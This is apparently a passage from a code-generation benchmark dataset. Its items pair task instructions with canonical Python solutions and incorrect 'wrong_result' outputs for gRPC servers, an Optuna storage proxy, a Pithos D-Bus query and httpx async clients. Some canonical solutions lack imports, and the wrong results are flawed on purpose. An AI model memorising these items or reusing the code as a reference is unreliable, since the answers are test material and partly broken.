    "Instruction": "Task Description: Implement a gRPC server class in Python that handles various types of requests (prompts, tensors, examples) for a distributed node service, with health check capability.\n\nClass Description: GRPCServer is a gRPC server implementation that processes different types of requests for a node service, including prompt processing, tensor processing, and example processing with training capabilities. It manages server lifecycle and handles large message sizes.\n\nAttributes:\n- node: [Any] - The node instance that processes the actual requests\n- host: [str] - The host address where the server will run\n- port: [int] - The port number where the server will listen\n- server: [grpc.aio.Server] - The gRPC server instance (initialized as None)\n\nMethods:\n- start() -> None - Initializes and starts the gRPC server with thread pool executor and configured message size limits\n- stop() -> None - Gracefully stops the gRPC server with a 5-second grace period\n- SendPrompt(request: [node_service_pb2.PromptRequest], context: [grpc.aio.ServicerContext]) -> [node_service_pb2.Tensor] - Processes prompt requests and returns tensor results\n- SendTensor(request: [node_service_pb2.TensorRequest], context: [grpc.aio.ServicerContext]) -> [node_service_pb2.Tensor] - Processes tensor requests and returns tensor results\n- SendExample(request: [node_service_pb2.ExampleRequest], context: [grpc.aio.ServicerContext]) -> [node_service_pb2.Loss] - Processes training examples and returns loss/gradients\n- HealthCheck(request: [node_service_pb2.HealthCheckRequest], context: [grpc.aio.ServicerContext]) -> [node_service_pb2.HealthCheckResponse] - Provides health check status of the server",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nimport numpy as np\nfrom asyncio import CancelledError\nfrom . import node_service_pb2\nfrom . import node_service_pb2_grpc\n\nclass GRPCServer(node_service_pb2_grpc.NodeServiceServicer):\n    def __init__(self, node, host: str, port: int):\n        self.node = node\n        self.host = host\n        self.port = port\n        self.server = None\n\n    async def start(self) -> None:\n        self.server = grpc.aio.server(\n            futures.ThreadPoolExecutor(max_workers=10),\n            options=[\n                (\"grpc.max_metadata_size\", 32*1024*1024),\n                (\"grpc.max_send_message_length\", 128*1024*1024),\n                (\"grpc.max_receive_message_length\", 128*1024*1024),\n            ],\n        )\n        node_service_pb2_grpc.add_NodeServiceServicer_to_server(self, self.server)\n        listen_addr = f\"{self.host}:{self.port}\"\n        self.server.add_insecure_port(listen_addr)\n        await self.server.start()\n\n    async def stop(self) -> None:\n        if self.server:\n            try:\n                await self.server.stop(grace=5)\n                await self.server.wait_for_termination()\n            except CancelledError:\n                pass\n\n    async def SendPrompt(self, request, context):\n        shard = Shard(\n            model_id=request.shard.model_id,\n            start_layer=request.shard.start_layer,\n            end_layer=request.shard.end_layer,\n            n_layers=request.shard.n_layers,\n        )\n        prompt = request.prompt\n        request_id = request.request_id\n        result = await self.node.process_prompt(shard, prompt, request_id)\n        tensor_data = result.tobytes() if result is not None else None\n        return node_service_pb2.Tensor(tensor_data=tensor_data, shape=result.shape, dtype=str(result.dtype)) if result is not None else node_service_pb2.Tensor()\n\n    async def SendTensor(self, request, context):\n        shard = Shard(\n            model_id=request.shard.model_id,\n            start_layer=request.shard.start_layer,\n            end_layer=request.shard.end_layer,\n            n_layers=request.shard.n_layers,\n        )\n        tensor = np.frombuffer(request.tensor.tensor_data, dtype=np.dtype(request.tensor.dtype)).reshape(request.tensor.shape)\n        request_id = request.request_id\n        result = await self.node.process_tensor(shard, tensor, request_id)\n        tensor_data = result.tobytes() if result is not None else None\n        return node_service_pb2.Tensor(tensor_data=tensor_data, shape=result.shape, dtype=str(result.dtype)) if result is not None else node_service_pb2.Tensor()\n\n    async def SendExample(self, request, context):\n        shard = Shard(\n            model_id=request.shard.model_id,\n            start_layer=request.shard.start_layer,\n            end_layer=request.shard.end_layer,\n            n_layers=request.shard.n_layers,\n        )\n        example = np.frombuffer(request.example.tensor_data, dtype=np.dtype(request.example.dtype)).reshape(request.example.shape)\n        target = np.frombuffer(request.target.tensor_data, dtype=np.dtype(request.target.dtype)).reshape(request.target.shape)\n        length = np.frombuffer(request.length.tensor_data, dtype=np.dtype(request.length.dtype)).reshape(request.length.shape)\n        train = request.train\n        request_id = request.request_id\n\n        if train and not shard.is_first_layer():\n            loss, grad = await self.node.process_example(shard, example, target, length, train, request_id)\n            tensor_data = grad.tobytes()\n            grad_tensor = node_service_pb2.Tensor(tensor_data=tensor_data, shape=grad.shape, dtype=str(grad.dtype))\n            return node_service_pb2.Loss(loss=loss, grads=grad_tensor)\n        else:\n            loss = await self.node.process_example(shard, example, target, length, train, request_id)\n            return node_service_pb2.Loss(loss=loss, grads=None)\n\n    async def HealthCheck(self, request, context):\n        return node_service_pb2.HealthCheckResponse(is_healthy=True)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "wrong_result": "import grpc.aio\nfrom concurrent import futures\nimport node_service_pb2\nimport node_service_pb2_grpc\nimport asyncio\n\nclass GRPCServer:\n    def __init__(self, node, host, port):\n        self.node = node\n        self.host = host\n        self.port = port\n        self.server = None\n\n    async def start(self):\n        self.server = grpc.aio.server(\n            options=[\n                ('grpc.max_send_message_length', 1024 * 1024 * 1024),\n                ('grpc.max_receive_message_length', 1024 * 1024 * 1024)\n            ]\n        )\n        node_service_pb2_grpc.add_NodeServiceServicer_to_server(\n            NodeServiceServicer(self.node), self.server\n        )\n        self.server.add_insecure_port(f\"{self.host}:{self.port}\")\n        await self.server.start()\n\n    async def stop(self):\n        await self.server.stop(grace=5)\n\nclass NodeServiceServicer(node_service_pb2_grpc.NodeServiceServicer):\n    def __init__(self, node):\n        self.node = node\n\n    async def SendPrompt(self, request: node_service_pb2.PromptRequest, context: grpc.aio.ServicerContext) -> node_service_pb2.Tensor:\n        return self.node.process_prompt(request)\n\n    async def SendTensor(self, request: node_service_pb2.TensorRequest, context: grpc.aio.ServicerContext) -> node_service_pb2.Tensor:\n        return self.node.process_tensor(request)\n\n    async def SendExample(self, request: node_service_pb2.ExampleRequest, context: grpc.aio.ServicerContext) -> node_service_pb2.Loss:\n        return self.node.process_example(request)\n\n    async def HealthCheck(self, request: node_service_pb2.HealthCheckRequest, context: grpc.aio.ServicerContext) -> node_service_pb2.HealthCheckResponse:\n        return node_service_pb2.HealthCheckResponse(status=\"SERVING\")"
  },
  {
    "Task_id": 495,
    "Instruction": "Task Description: Create a function to set up and tear down a gRPC server with configurable interceptors and thread pool workers.\n\nFunction Description: The function `_set_up` initializes and starts a gRPC server with optional interceptors, while `_tear_down` gracefully stops the server. The server is configured to handle gRPC requests concurrently using a thread pool.\n\nInput:\n- `interceptors` (Optional[List[grpc.ServerInterceptor]]): A list of gRPC server interceptors for request/response processing. Defaults to None.\n- `server` (grpc.Server): The gRPC server instance to be stopped (for `_tear_down`).\n\nOutput:\n- `_set_up` returns the initialized and started `grpc.Server` instance.\n- `_tear_down` has no return value (stops the server).",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom typing import List, Optional\n\ndef _set_up(interceptors: Optional[List[grpc.ServerInterceptor]] = None):\n    server = grpc.server(\n        futures.ThreadPoolExecutor(max_workers=2),\n        interceptors=interceptors,\n    )\n    add_gRPCTestServiceServicer_to_server(TestService(), server)\n    server.add_insecure_port(\"[::]:{}\".format(PORT))\n    server.start()\n    return server\n\ndef _tear_down(server: grpc.Server):\n    server.stop(None)",
    "Code_level": "Function-level",
    "FSMID_for_test": 74,
    "wrong_result": "def _set_up(interceptors=None, server=None):\n    import grpc\n    from concurrent import futures\n    from threading import Thread\n\n    if server is None:\n        server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n    \n    if interceptors:\n        for interceptor in interceptors:\n            server.add_interceptor(interceptor)\n    \n    # Start the server in a separate thread\n    server_thread = Thread(target=server.start)\n    server_thread.daemon = True\n    server_thread.start()\n    \n    return server\n\ndef _tear_down(server):\n    server.stop(0)"
  },
  {
    "Task_id": 498,
    "Instruction": "Task Description: Implement a gRPC server for Optuna storage proxy service that handles study and trial management operations.\n\nClass Description: OptunaStorageProxyService is a gRPC servicer class that implements the StorageService interface, providing methods to manage Optuna studies and trials through a gRPC server. It acts as a proxy between gRPC clients and the underlying Optuna storage backend.\n\nAttributes:\n- _backend: BaseStorage - The underlying Optuna storage implementation\n- _lock: threading.Lock - A lock for thread-safe operations\n\nMethods:\n- CreateNewStudy(request: api_pb2.CreateNewStudyRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewStudyReply - Creates a new study with given directions and name\n- DeleteStudy(request: api_pb2.DeleteStudyRequest, context: grpc.ServicerContext) -> api_pb2.DeleteStudyReply - Deletes a study with the given ID\n- SetStudyUserAttribute(request: api_pb2.SetStudyUserAttributeRequest, context: grpc.ServicerContext) -> api_pb2.SetStudyUserAttributeReply - Sets a user attribute for a study\n- GetStudyIdFromName(request: api_pb2.GetStudyIdFromNameRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyIdFromNameReply - Gets study ID from study name\n- GetStudyNameFromId(request: api_pb2.GetStudyNameFromIdRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyNameFromIdReply - Gets study name from study ID\n- GetAllStudies(request: api_pb2.GetAllStudiesRequest, context: grpc.ServicerContext) -> api_pb2.GetAllStudiesReply - Gets all studies in the storage\n- CreateNewTrial(request: api_pb2.CreateNewTrialRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewTrialReply - Creates a new trial in a study\n- SetTrialParameter(request: api_pb2.SetTrialParameterRequest, context: grpc.ServicerContext) -> api_pb2.SetTrialParameterReply - Sets parameters for a trial\n- GetTrial(request: api_pb2.GetTrialRequest, context: grpc.ServicerContext) -> api_pb2.GetTrialReply - Gets trial details\n- GetAllTrials(request: api_pb2.GetAllTrialsRequest, context: grpc.ServicerContext) -> api_pb2.GetAllTrialsReply - Gets all trials for a study with optional state filtering",
    "Canonical_solution": "from concurrent.futures import ThreadPoolExecutor\nimport grpc\nfrom optuna.storages._grpc.grpc_imports import api_pb2_grpc\nfrom optuna.storages._grpc.grpc_imports import api_pb2\nfrom optuna.storages._grpc.grpc_imports import StorageServiceServicer\nfrom optuna.storages import BaseStorage\nfrom optuna._experimental import experimental_func\nimport logging\n\n_logger = logging.get_logger(__name__)\n\nclass OptunaStorageProxyService(StorageServiceServicer):\n    def __init__(self, storage: BaseStorage) -> None:\n        self._backend = storage\n        self._lock = threading.Lock()\n\n    def CreateNewStudy(self, request: api_pb2.CreateNewStudyRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewStudyReply:\n        directions = [\n            StudyDirection.MINIMIZE if d == api_pb2.MINIMIZE else StudyDirection.MAXIMIZE\n            for d in request.directions\n        ]\n        study_name = request.study_name\n\n        try:\n            study_id = self._backend.create_new_study(directions=directions, study_name=study_name)\n        except DuplicatedStudyError as e:\n            context.abort(code=grpc.StatusCode.ALREADY_EXISTS, details=str(e))\n        return api_pb2.CreateNewStudyReply(study_id=study_id)\n\n    def DeleteStudy(self, request: api_pb2.DeleteStudyRequest, context: grpc.ServicerContext) -> api_pb2.DeleteStudyReply:\n        study_id = request.study_id\n        try:\n            self._backend.delete_study(study_id)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.DeleteStudyReply()\n\n    def SetStudyUserAttribute(self, request: api_pb2.SetStudyUserAttributeRequest, context: grpc.ServicerContext) -> api_pb2.SetStudyUserAttributeReply:\n        try:\n            self._backend.set_study_user_attr(\n                request.study_id, request.key, json.loads(request.value)\n            )\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.SetStudyUserAttributeReply()\n\n    def GetStudyIdFromName(self, request: api_pb2.GetStudyIdFromNameRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyIdFromNameReply:\n        try:\n            study_id = self._backend.get_study_id_from_name(request.study_name)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.GetStudyIdFromNameReply(study_id=study_id)\n\n    def GetStudyNameFromId(self, request: api_pb2.GetStudyNameFromIdRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyNameFromIdReply:\n        study_id = request.study_id\n        try:\n            name = self._backend.get_study_name_from_id(study_id)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        assert name is not None\n        return api_pb2.GetStudyNameFromIdReply(study_name=name)\n\n    def GetAllStudies(self, request: api_pb2.GetAllStudiesRequest, context: grpc.ServicerContext) -> api_pb2.GetAllStudiesReply:\n        studies = self._backend.get_all_studies()\n        return api_pb2.GetAllStudiesReply(\n            studies=[\n                api_pb2.Study(\n                    study_id=study._study_id,\n                    study_name=study.study_name,\n                    directions=[\n                        api_pb2.MINIMIZE if d == StudyDirection.MINIMIZE else api_pb2.MAXIMIZE\n                        for d in study.directions\n                    ],\n                    user_attributes={\n                        key: json.dumps(value) for key, value in study.user_attrs.items()\n                    },\n                    system_attributes={\n                        key: json.dumps(value) for key, value in study.system_attrs.items()\n                    },\n                )\n                for study in studies\n            ]\n        )\n\n    def CreateNewTrial(self, request: api_pb2.CreateNewTrialRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewTrialReply:\n        study_id = request.study_id\n        template_trial = None\n        if not request.template_trial_is_none:\n            template_trial = _from_proto_trial(request.template_trial)\n\n        try:\n            trial_id = self._backend.create_new_trial(study_id, template_trial)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.CreateNewTrialReply(trial_id=trial_id)\n\n    def SetTrialParameter(self, request: api_pb2.SetTrialParameterRequest, context: grpc.ServicerContext) -> api_pb2.SetTrialParameterReply:\n        trial_id = request.trial_id\n        param_name = request.param_name\n        param_value_internal = request.param_value_internal\n        distribution = json_to_distribution(request.distribution)\n        try:\n            self._backend.set_trial_param(trial_id, param_name, param_value_internal, distribution)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        except RuntimeError as e:\n            context.abort(code=grpc.StatusCode.FAILED_PRECONDITION, details=str(e))\n        except ValueError as e:\n            context.abort(code=grpc.StatusCode.INVALID_ARGUMENT, details=str(e))\n        return api_pb2.SetTrialParameterReply()\n\n    def GetTrial(self, request: api_pb2.GetTrialRequest, context: grpc.ServicerContext) -> api_pb2.GetTrialReply:\n        trial_id = request.trial_id\n        try:\n            trial = self._backend.get_trial(trial_id)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.GetTrialReply(trial=_to_proto_trial(trial))\n\n    def GetAllTrials(self, request: api_pb2.GetAllTrialsRequest, context: grpc.ServicerContext) -> api_pb2.GetAllTrialsReply:\n        study_id = request.study_id\n        states = [_from_proto_trial_state(state) for state in request.states]\n        try:\n            trials = self._backend.get_all_trials(\n                study_id,\n                deepcopy=False,\n                states=states,\n            )\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.GetAllTrialsReply(trials=[_to_proto_trial(trial) for trial in trials])\n\n@experimental_func(\"4.2.0\")\ndef run_grpc_proxy_server(\n    storage: BaseStorage,\n    *,\n    host: str = \"localhost\",\n    port: int = 13000,\n    thread_pool: ThreadPoolExecutor | None = None,\n) -> None:\n    server = grpc.server(thread_pool or ThreadPoolExecutor(max_workers=10))\n    api_pb2_grpc.add_StorageServiceServicer_to_server(\n        OptunaStorageProxyService(storage), server\n    )\n    server.add_insecure_port(f\"{host}:{port}\")\n    server.start()\n    _logger.info(f\"Server started at {host}:{port}\")\n    _logger.info(\"Listening...\")\n    server.wait_for_termination()",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "wrong_result": "import grpc\nfrom optuna.storages import BaseStorage\nfrom optuna.proto import api_pb2, api_pb2_grpc\n\nclass OptunaStorageProxyService(api_pb2_grpc.StorageServiceServicer):\n    def __init__(self, backend: BaseStorage):\n        self._backend = backend\n        self._lock = threading.Lock()\n\n    def CreateNewStudy(self, request: api_pb2.CreateNewStudyRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewStudyReply:\n        with self._lock:\n            study_id = self._backend.create_study(name=request.name, directions=request.directions)\n            return api_pb2.CreateNewStudyReply(study_id=study_id)\n\n    def DeleteStudy(self, request: api_pb2.DeleteStudyRequest, context: grpc.ServicerContext) -> api_pb2.DeleteStudyReply:\n        with self._lock:\n            self._backend.delete_study(study_id=request.study_id)\n            return api_pb2.DeleteStudyReply()\n\n    def SetStudyUserAttribute(self, request: api_pb2.SetStudyUserAttributeRequest, context: grpc.ServicerContext) -> api_pb2.SetStudyUserAttributeReply:\n        with self._lock:\n            self._backend.set_study_user_attribute(request.study_id, request.key, request.value)\n            return api_pb2.SetStudyUserAttributeReply()\n\n    def GetStudyIdFromName(self, request: api_pb2.GetStudyIdFromNameRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyIdFromNameReply:\n        with self._lock:\n            study_id = self._backend.get_study_id_from_name(request.name)\n            return api_pb2.GetStudyIdFromNameReply(study_id=study_id)\n\n    def GetStudyNameFromId(self, request: api_pb2.GetStudyNameFromIdRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyNameFromIdReply:\n        with self._lock:\n            study_name = self._backend.get_study_name_from_id(request.study_id)\n            return api_pb2.GetStudyNameFromIdReply(study_name=study_name)\n\n    def GetAllStudies(self, request: api_pb2.GetAllStudiesRequest, context: grpc.ServicerContext) -> api_pb2.GetAllStudiesReply:\n        with self._lock:\n            studies = self._backend.get_all_studies()\n            reply = api_pb2.GetAllStudiesReply()\n            for study in studies:\n                reply.studies.append(study)\n            return reply\n\n    def CreateNewTrial(self, request: api_pb2.CreateNewTrialRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewTrialReply:\n        with self._lock:\n            trial_id = self._backend.create_trial(request.study_id)\n            return api_pb2.CreateNewTrialReply(trial_id=trial_id)\n\n    def SetTrialParameter(self, request: api_pb2.SetTrialParameterRequest, context: grpc.ServicerContext) -> api_pb2.SetTrialParameterReply:\n        with self._lock:\n            self._backend.set_trial_parameter(request.trial_id, request.key, request.value)\n            return api_pb2.SetTrialParameterReply()\n\n    def GetTrial(self, request: api_pb2.GetTrialRequest, context: grpc.ServicerContext) -> api_pb2.GetTrialReply:\n        with self._lock:\n            trial = self._backend.get_trial(request.trial_id)\n            return api_pb2.GetTrialReply(trial=trial)\n\n    def GetAllTrials(self, request: api_pb2.GetAllTrialsRequest, context: grpc.ServicerContext) -> api_pb2.GetAllTrialsReply:\n        with self._lock:\n            trials = self._backend.get_trials(request.study_id, request.state)\n            reply = api_pb2.GetAllTrialsReply()\n            for trial in trials:\n                reply.trials.append(trial)\n            return reply"
  },
  {
    "Task_id": 5,
    "Instruction": "Task Description: Create a Python function that interacts with the Pithos music player via D-Bus to retrieve and format the currently playing song's artist and title.\n\nFunction Description: The function connects to the user's D-Bus session bus, accesses the Pithos music player service, retrieves the current song information, and returns it in a formatted string combining the artist and title.\n\nInput: None\n\nOutput: str - A string in the format \"Artist - Title\" representing the currently playing song in Pithos, or None if the operation fails.",
    "Canonical_solution": "import dbus\n\ndef get_pithos_current_song():\n    pithos_bus = dbus.SessionBus()\n    pithos = pithos_bus.get_object(\"net.kevinmehall.Pithos\", \"/net/kevinmehall/Pithos\")\n    props = pithos.get_dbus_method(\"GetCurrentSong\", \"net.kevinmehall.Pithos\")\n    return props()[\"artist\"] + \" - \" + props()[\"title\"]",
    "Code_level": "Function-level",
    "FSMID_for_test": 75,
    "wrong_result": "import dbus\n\ndef get_pithos_current_song():\n    bus = dbus.SessionBus()\n    player = bus.get_object('org.pithos.Player', '/org/pithos/Player')\n    interface = dbus.Interface(player, 'org.pithos.Player')\n\n    try:\n        artist = interface.GetArtist()\n        title = interface.GetTitle()\n        return f\"{artist} - {title}\"\n    except dbus.exceptions.DBusException:\n        return None"
  },
  {
    "Task_id": 52,
    "Instruction": "Task Description: Create an asynchronous function to send an HTTP POST request with candidate and role data to a specified endpoint, and return the response as a dictionary.\n\nFunction Description: The function uses httpx.AsyncClient to asynchronously send a POST request containing candidate information and role details to a server endpoint. It handles the response by converting it to JSON format and returns the result. The function is designed to be non-blocking and should be called within an async context.\n\nInput:\n- candidates: list[dict] - A list of candidate dictionaries, each containing:\n  - name: str - The candidate's name\n  - self_identified_seniority: int - The candidate's self-assessed seniority level\n  - bio: str - The candidate's biography/description\n- role: dict - A dictionary containing role details:\n  - title: str - The job title\n  - desired_seniority: int - The desired seniority level for the role\n  - description: str - The job description\n\nOutput:\n- dict - The JSON-decoded response from the server containing the processed results",
    "Canonical_solution": "import asyncio\nimport json\nimport httpx\n\nasync def send_http_request(candidates: list, role: dict) -> dict:\n    async with httpx.AsyncClient() as client:\n        response = await client.post(\n            \"http://localhost:8000/interview\",\n            json={\"candidates\": candidates, \"role\": role},\n        )\n        result = response.json()\n        return result\n\nif __name__ == \"__main__\":\n    candidates = [\n        {\n            \"name\": \"Alice\",\n            \"self_identified_seniority\": 3,\n            \"bio\": \"10 years with postgres, 5 years with python, 3 years with django.\",\n        },\n        {\n            \"name\": \"Bob\",\n            \"self_identified_seniority\": 1,\n            \"bio\": \"I just graduated from a coding bootcamp and I'm ready to take on the world!\",\n        },\n        {\n            \"name\": \"Charlie\",\n            \"self_identified_seniority\": 2,\n            \"bio\": \"graduated 2 years ago and i can make you a react app in no time\",\n        },\n        {\n            \"name\": \"David\",\n            \"self_identified_seniority\": 3,\n            \"bio\": \"i just been riding that SCRUM wave for 10 years fam\",\n        },\n    ]\n    role = {\n        \"title\": \"Senior Software Engineer\",\n        \"desired_seniority\": 3,\n        \"description\": \"Build and maintain a large-scale web application with a team of 10+ engineers.\",\n    }\n    result = asyncio.run(send_http_request(candidates, role))\n    print(json.dumps(result, indent=2))",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "async def send_post_request(candidates, role, endpoint):\n    async with httpx.AsyncClient() as client:\n        data = {\n            \"candidates\": candidates,\n            \"role\": role\n        }\n        response = await client.post(endpoint, json=data)\n        response_data = response.json()\n        return response_data"
  },
  {
    "Task_id": 55,
    "Instruction": "Task Description: Create an asynchronous function to check if the ngrok API is online and wait for it to become available if it's not.\n\nFunction Description: The function continuously attempts to connect to the ngrok API at a specified URL (constructed from environment variables) until it receives a successful response. It uses exponential backoff (fixed interval retries) between attempts and logs the connection status. The function is designed to be used in scenarios where you need to ensure the ngrok API is available before proceeding with operations that depend on it.\n\nInput: \n- None (uses environment variables NGROK_HOST and NGROK_PORT to construct the API URL)\n  \nOutput: \n- Returns True when the ngrok API is successfully reached\n- Does not return until a successful connection is established (infinite retry loop)",
    "Canonical_solution": "import asyncio\nimport httpx\nimport logging\n\nlogger = logging.getLogger(__name__)\n\nasync def wait_for_ngrok_api():\n    NGROK_API_URL = f\"http://{os.getenv('NGROK_HOST', 'ngrok')}:{os.getenv('NGROK_PORT', 4040)}\"\n    RETRY_INTERVAL = 15\n\n    while True:\n        try:\n            async with httpx.AsyncClient() as client:\n                response = await client.get(f\"{NGROK_API_URL}/api/tunnels\")\n                response.raise_for_status()\n                logger.debug(\"ngrok API is online.\")\n                return True\n        except httpx.RequestError:\n            logger.debug(\"ngrok API is offline. Waiting...\")\n            await asyncio.sleep(RETRY_INTERVAL)",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "import os\nimport time\nimport asyncio\nimport requests\n\nasync def wait_for_ngrok_api():\n    ngrok_host = os.getenv('NGROK_HOST')\n    ngrok_port = os.getenv('NGROK_PORT')\n    url = f\"https://{ngrok_host}:{ngrok_port}/api/v4/health\"\n\n    retries = 0\n    max_retries = 10\n    backoff_factor = 2\n\n    while True:\n        try:\n            async with asyncio.timeout(5):\n                response = await asyncio.get_event_loop().run_in_executor(None, requests.get, url)\n                if response.status_code == 200:\n                    print(\"Ngrok API is online.\")\n                    return True\n        except Exception as e:\n            print(f\"Ngrok API not available. Error: {e}\")\n        \n        retries += 1\n        if retries > max_retries:\n            print(\"Failed to connect to Ngrok API after maximum retries.\")\n            return False\n        \n        wait_time = backoff_factor ** retries\n        print(f\"Retrying in {wait_time} seconds...\")\n        await asyncio.sleep(wait_time)"
  },
  {
    "Task_id": 56,
    "Instruction": "Task Description: Create a Python class that provides asynchronous HTTP client functionality using httpx and asyncio, supporting common HTTP methods (GET, POST), file downloads, and proxy configuration.\n\nClass Description: AsyncHttpx is a utility class for making asynchronous HTTP requests with features like automatic retry on multiple URLs, proxy support, and file downloads. It handles connection timeouts and HTTP errors gracefully.\n\nAttributes:\n- proxy: ClassVar[dict[str, Union[str, None]]] - A class-level dictionary storing proxy configurations for HTTP and HTTPS protocols\n\nMethods:\n- get(url: Union[str, list[str]], *, params: Optional[dict[str, Any]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> Response - Performs an asynchronous GET request to one or multiple URLs, returning the first successful response\n- _get_first_successful(urls: list[str], **kwargs) -> Response - Internal method to attempt requests on multiple URLs until first success\n- _get_single(url: str, *, params: Optional[dict[str, Any]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> Response - Internal method to perform a single GET request\n- post(url: str, *, data: Optional[dict[str, Any]] = None, content: Any = None, files: Any = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, json: Optional[dict[str, Any]] = None, params: Optional[dict[str, str]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> Response - Performs an asynchronous POST request with various payload options\n- download_file(url: Union[str, list[str]], path: Union[str, Path], *, params: Optional[dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> bool - Downloads a file from a URL to the specified path, returning success status",
    "Canonical_solution": "import asyncio\nfrom asyncio.exceptions import TimeoutError\nimport httpx\nfrom httpx import ConnectTimeout, HTTPStatusError, Response\nfrom typing import Any, ClassVar, Optional, Union\nfrom pathlib import Path\nimport aiofiles\n\nclass AsyncHttpx:\n    proxy: ClassVar[dict[str, Union[str, None]]] = {\n        \"http://\": None,\n        \"https://\": None,\n    }\n\n    @classmethod\n    async def get(\n        cls,\n        url: Union[str, list[str]],\n        *,\n        params: Optional[dict[str, Any]] = None,\n        headers: Optional[dict[str, str]] = None,\n        cookies: Optional[dict[str, str]] = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs,\n    ) -> Response:\n        urls = [url] if isinstance(url, str) else url\n        return await cls._get_first_successful(\n            urls,\n            params=params,\n            headers=headers,\n            cookies=cookies,\n            verify=verify,\n            use_proxy=use_proxy,\n            proxy=proxy,\n            timeout=timeout,\n            **kwargs,\n        )\n\n    @classmethod\n    async def _get_first_successful(\n        cls,\n        urls: list[str],\n        **kwargs,\n    ) -> Response:\n        last_exception = None\n        for url in urls:\n            try:\n                return await cls._get_single(url, **kwargs)\n            except Exception as e:\n                last_exception = e\n        raise last_exception or Exception(\"All URLs failed\")\n\n    @classmethod\n    async def _get_single(\n        cls,\n        url: str,\n        *,\n        params: Optional[dict[str, Any]] = None,\n        headers: Optional[dict[str, str]] = None,\n        cookies: Optional[dict[str, str]] = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs,\n    ) -> Response:\n        _proxy = proxy or (cls.proxy if use_proxy else None)\n        async with httpx.AsyncClient(proxies=_proxy, verify=verify) as client:\n            return await client.get(\n                url,\n                params=params,\n                headers=headers,\n                cookies=cookies,\n                timeout=timeout,\n                **kwargs,\n            )\n\n    @classmethod\n    async def post(\n        cls,\n        url: str,\n        *,\n        data: Optional[dict[str, Any]] = None,\n        content: Any = None,\n        files: Any = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[dict[str, str]] = None,\n        json: Optional[dict[str, Any]] = None,\n        params: Optional[dict[str, str]] = None,\n        headers: Optional[dict[str, str]] = None,\n        cookies: Optional[dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs,\n    ) -> Response:\n        _proxy = proxy or (cls.proxy if use_proxy else None)\n        async with httpx.AsyncClient(proxies=_proxy, verify=verify) as client:\n            return await client.post(\n                url,\n                content=content,\n                data=data,\n                files=files,\n                json=json,\n                params=params,\n                headers=headers,\n                cookies=cookies,\n                timeout=timeout,\n                **kwargs,\n            )\n\n    @classmethod\n    async def download_file(\n        cls,\n        url: Union[str, list[str]],\n        path: Union[str, Path],\n        *,\n        params: Optional[dict[str, str]] = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[dict[str, str]] = None,\n        headers: Optional[dict[str, str]] = None,\n        cookies: Optional[dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs,\n    ) -> bool:\n        if isinstance(path, str):\n            path = Path(path)\n        path.parent.mkdir(parents=True, exist_ok=True)\n        \n        try:\n            response = await cls.get(\n                url,\n                params=params,\n                headers=headers,\n                cookies=cookies,\n                use_proxy=use_proxy,\n                proxy=proxy,\n                timeout=timeout,\n                **kwargs,\n            )\n            response.raise_for_status()\n            async with aiofiles.open(path, \"wb\") as wf:\n                await wf.write(response.content)\n            return True\n        except (TimeoutError, ConnectTimeout, HTTPStatusError) as e:\n            return False",
    "Code_level": "Class-level",
    "FSMID_for_test": 59,
